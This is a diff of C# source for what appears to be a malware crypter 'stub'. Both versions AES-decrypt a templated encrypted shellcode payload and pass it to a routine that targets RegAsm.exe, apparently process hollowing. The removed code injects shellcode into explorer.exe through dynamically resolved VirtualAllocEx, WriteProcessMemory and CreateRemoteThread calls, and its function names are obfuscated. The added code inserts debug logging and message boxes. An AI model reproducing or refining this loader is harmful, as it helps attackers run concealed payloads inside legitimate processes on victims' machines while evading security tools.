@@ -1,78 +1,34 @@
-using Encryption;
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-//using System.Threading;
+using System.Windows.Forms;
 
 namespace Stub
 {
     internal static class Program
     {
-        #region Delegates
-        // ProcessOpen
-        private delegate IntPtr ProcOpen(uint processAccess, bool bInheritHandle, int processId);
-        
-        // VirtualAllocEx
-        private delegate IntPtr AllocateMem(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint fLProtect);
-        
-        // WriteProcessMemory
-        private delegate bool WriteMem(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-        
-        // CreateRemoteThread
-        private delegate IntPtr Create(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        
-        // GetCurrentProcess
-        private delegate IntPtr GetProc();
-
-        #region Delegate API
-        private static readonly ProcOpen Open = LoadApi<ProcOpen>("kernel32", "ProcessOpen");
-        private static readonly AllocateMem Allocate = LoadApi<AllocateMem>("kernel32", "VirtualAllocEx");
-        private static readonly WriteMem Write = LoadApi<WriteMem>("kernel32", "WriteProcessMemory");
-        private static readonly Create CreateThread = LoadApi<Create>("kernel32", "CreateRemoteThread");
-        private static readonly GetProc GetProcess = LoadApi<GetProc>("kernel32", "GetCurrentProcess");
-        #endregion
-
-        #endregion
-
-        #region CreateAPI
-        [DllImport("kernel32", SetLastError = true)]
-        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
-        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        private static CreateApi LoadApi<CreateApi>(string name, string method)
-        {
-            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
-        }
-        #endregion
-
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
         [STAThread]
         static void Main()
         {
+            
+            byte[] key = Convert.FromBase64String("%KEY%");
+            byte[] iv = Convert.FromBase64String("%IV%");
+            byte[] base64 = Convert.FromBase64String("%BASE64%");    // trying to encapsulate it within 'Buf' method
+
+            LogDecryptedBase64(Convert.ToBase64String(base64));
+            LogEncryptionResult("Encrypted bytes", base64);
+
+            byte[] debase64Aes = AES.Decryption(base64, key, iv);    // instead of this, we can pass the decryption method as an arg to Kenneth.August.Crystal()
+
+            LogDecryptedBase64(Convert.ToBase64String(debase64Aes));
+            LogEncryptionResult("Decrypted bytes", debase64Aes);
+
             try
             {
-                byte[] key = Convert.FromBase64String("%KEY%");
-                byte[] iv = Convert.FromBase64String("%IV%");
-                // byte[] base64 = Convert.FromBase64String("%BASE64%");    // trying to encapsulate it within 'Buf' method
-                // byte[] debase64Aes = AES.D3Srypti0n(base64, key, iv);    // instead of this line, we passing the method with arguments, straightforward
-
-                //Thread.Sleep(5000);
-                //switch(Up1oad(AES.D3Srypti0n(Buf(), key, iv))) // original :: replace 'Buf()' with base64
-                //{
-                //    case true:
-                //        Console.WriteLine("[+] Check listener! [+]");
-                //        break;
-                //    case false:
-                //        Console.WriteLine("[+] Failed! [+]");
-                //        break;
-                //}
-
-                //Kenneth.August.Crystal(debase64Aes, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // original version
-                Kenneth.August.Crystal(AES.D3Srypti0n(Buf(), key, iv), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // enchanced version
+                Kenneth.August.Crystal(debase64Aes, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // original version
+                //Kenneth.August.Crystal(AES.Decryption(Buf(), key, iv), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe")); // enchanced version
             }
             catch (Exception ex)
             {
@@ -80,21 +36,95 @@ namespace Stub
             }
         }
 
+        // ///////////////////////////////////////////////////////////////
+        #region Logging Region
+        private static void LogDecryptedBase64(string decryptedBase64)
+        {
+            try
+            {
+                using (StreamWriter writer = new StreamWriter("logging_Stub_Output.txt", true))
+                {
+                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                    writer.WriteLine(timestamp);
+
+                    writer.WriteLine("\n\n\n" + decryptedBase64 + "\n\n\n");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error logging: " + ex.Message);
+            }
+        }
+        private static void LogEncryptionResult(string operation, byte[] data)
+        {
+            try
+            {
+                using (StreamWriter writer = new StreamWriter("logging_Stub_decryption_bytes.txt", true))
+                {
+                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                    writer.WriteLine(timestamp + " \n\n\n " + operation + " Result:\n\n\n");
+
+                    string hexString = BitConverter.ToString(data).Replace("-", "");
+                    writer.WriteLine(hexString);
+
+                    writer.WriteLine();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error logging " + operation + " result: " + ex.Message);
+            }
+        }
+        #endregion
+
+        // ///////////////////////////////////////////////////////////////
+        #region Encrypted raw data Encapsulation
         private static byte[] Buf()
         {
             return Convert.FromBase64String("%BASE64%"); // we deleted 'byte[] base64 = ' from _______ byte[] base64 = Convert.FromBase64String("%BASE64%");
         }
+        #endregion
 
-        private static bool Up1oad(byte[] Cover)
+
+        class AES
         {
-            System.Diagnostics.Process[] Procode = System.Diagnostics.Process.GetProcessesByName("explorer");
-            int pid = Procode[0].Id;
-            IntPtr ProcessHard = Open(0x001F0FFF, false, pid);
-            IntPtr acute = Allocate(ProcessHard, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-            IntPtr SizeOurt;
-            Write(ProcessHard, acute, Cover, Cover.Length, out SizeOurt);
-            CreateThread(ProcessHard, IntPtr.Zero, 0, acute, IntPtr.Zero, 0, IntPtr.Zero);
-            return true;
+            public static byte[] Decryption(byte[] shellcode, byte[] key, byte[] iv)
+            {
+                try
+                {
+                    using (var aes = Aes.Create())
+                    {
+                        aes.KeySize = 128;
+                        aes.BlockSize = 128;
+                        aes.Padding = PaddingMode.PKCS7;
+                        aes.Mode = CipherMode.CBC;
+
+                        aes.Key = key;
+                        aes.IV = iv;
+
+                        using (var encryptor = aes.CreateDecryptor())
+                        {
+                            using (var msEncShellcode = new MemoryStream())
+                            {
+                                using (var cryptoStream = new CryptoStream(msEncShellcode, encryptor, CryptoStreamMode.Write))
+                                {
+                                    cryptoStream.Write(shellcode, 0, shellcode.Length);
+                                    cryptoStream.FlushFinalBlock();
+
+                                    MessageBox.Show("Stub Decrypted!");
+                                    return msEncShellcode.ToArray();
+                                }
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Stub Decryption Error!");
+                    Console.WriteLine("Error: " + ex.Message);
+                    return null;
+                }
+            }
         }
     }
 }
@@ -264,49 +294,6 @@ namespace Kenneth
             }
             while (I < nSec);
             return true;
-        }
-    }
-}
-
-
-namespace Encryption
-{
-    class AES
-    {
-        public static byte[] D3Srypti0n(byte[] shellcode, byte[] key, byte[] iv)
-        {
-            try
-            {
-                using (var aes = Aes.Create())
-                {
-                    aes.KeySize = 128;
-                    aes.BlockSize = 128;
-                    aes.Padding = PaddingMode.PKCS7;
-                    aes.Mode = CipherMode.CBC;
-
-                    aes.Key = key;
-                    aes.IV = iv;
-
-                    using (var encryptor = aes.CreateDecryptor())
-                    {
-                        using (var msEncShellcode = new MemoryStream())
-                        {
-                            using (var cryptoStream = new CryptoStream(msEncShellcode, encryptor, CryptoStreamMode.Write))
-                            {
-                                cryptoStream.Write(shellcode, 0, shellcode.Length);
-                                cryptoStream.FlushFinalBlock();
-
-                                return msEncShellcode.ToArray();
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error during decryption: " + ex.Message);
-                return null;
-            }
         }
     }
 }
